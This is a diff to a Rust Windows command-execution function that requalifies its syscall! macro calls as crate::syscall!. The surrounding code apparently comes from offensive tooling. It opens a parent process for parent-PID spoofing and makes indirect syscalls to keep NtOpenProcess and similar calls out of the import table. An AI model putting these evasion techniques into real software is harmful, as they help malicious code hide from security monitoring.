@@ -124,7 +124,7 @@ pub fn execute_command(
             obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
             let mut client_id = [0u64; 2];
             client_id[0] = parent_pid as u64;
-            let status = syscall!(
+            let status = crate::syscall!(
                 "NtOpenProcess",
                 &mut p_handle_raw as *mut _ as u64,
                 PROCESS_CREATE_PROCESS as u64,
@@ -208,7 +208,7 @@ pub fn execute_command(
                     protect_from_close: u8,
                 }
                 let flag_info = ObjHandleFlagInfo { inherit: 0, protect_from_close: 0 };
-                let _ = syscall!(
+                let _ = crate::syscall!(
                     "NtSetInformationObject",
                     stdout_rd as u64,                            // Handle
                     4u64,                                        // ObjectHandleFlagInformation
@@ -302,7 +302,7 @@ pub fn execute_command(
         }
 
         // WaitForSingleObject → NtWaitForSingleObject (indirect syscall, no IAT entry)
-        let _ = syscall!(
+        let _ = crate::syscall!(
             "NtWaitForSingleObject",
             pi.hProcess as u64,    // Handle
             0u64,                    // Alertable = FALSE
@@ -321,7 +321,7 @@ pub fn execute_command(
             exit_status: i32,
         }
         let mut pbi: ProcessBasicInformation = std::mem::zeroed();
-        let _ = syscall!(
+        let _ = crate::syscall!(
             "NtQueryInformationProcess",
             pi.hProcess as u64,                            // ProcessHandle
             0u64,                                           // ProcessBasicInformation
@@ -331,8 +331,8 @@ pub fn execute_command(
         );
         let exit_code = if pbi.exit_status == 259 { 259u32 } else { pbi.exit_status as u32 };
 
-        let _ = syscall!("NtClose", pi.hThread as u64);
-        let _ = syscall!("NtClose", pi.hProcess as u64);
+        let _ = crate::syscall!("NtClose", pi.hThread as u64);
+        let _ = crate::syscall!("NtClose", pi.hProcess as u64);
 
         use std::os::windows::process::ExitStatusExt;
         Ok(std::process::Output {
